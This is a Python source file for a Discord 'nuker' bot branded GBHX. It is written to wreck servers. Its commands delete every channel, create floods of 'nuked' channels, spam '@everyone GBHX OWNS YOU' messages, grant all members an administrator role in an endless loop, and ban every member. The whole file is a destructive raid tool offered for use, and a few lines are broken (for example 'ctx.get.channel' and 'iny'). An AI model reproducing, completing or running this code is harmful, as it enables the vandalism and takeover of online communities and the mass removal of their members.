from discord import Permissions 
import discord,random,time
import json
from discord.ext import commands 
import os 
import colorama
import asyncio
from colorama import Fore
from discord import Embed 




colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!",intents=intents)
bot.remove_command("help")
with open('discord/config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]
@bot.event
async def on_ready():
    print(f'''
{Fore.LIGHTCYAN_EX}GBHX
{Fore.LIGHTCYAN_EX}NUKER  
Logged in and Ready                
''')

@bot.command()
async def d(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 834134636678479902:
        await channel.delete()
      else:
        continue
    await ctx.guild.create_text_channel(name="nuked")
    print("Nuked All Channels")
    return
  else:
    try:
      channel = ctx.get.channel(id=iny(channel_id))
      await channel.delete()
    except:
      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
      await ctx.send(embed=e2)
    return

@bot.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete() 
    while True:
        try:
            guild = ctx.guild
            role = await guild.create_role(name="GBHX NUKER", permissions=discord.Permissions(8),colour=discord.Colour(000000))
            for user in ctx.guild.members:
                await user.add_roles(role)
                print("Gave you admin ")
        except:
            print("Couldnt give you admin")


@bot.command()
async def nuke1(ctx,amount=10,name_of_channel="nuked-by-gbhx"):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    if channel.name != "nuked-by-gbhx":
        await channel.delete()
    else:
        continue
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel) 
  for i in range(10):
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"Nuked! @everyone GBHX OWNS YOU         ")
          await webhook.send()
        except:
          pass 

@bot.command()
async def nuke(ctx,amount=10,name_of_channel="nuked-by-gbhx"):
  await ctx.message.delete()
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel) 
  for i in range(10):
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"Nuked! @everyone GBHX OWNS YOU         ")
          await webhook.send()
        except:
          pass 



@bot.command()
async def banAll(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"Banned {user}")
        except:
           pass



bot.run(token)


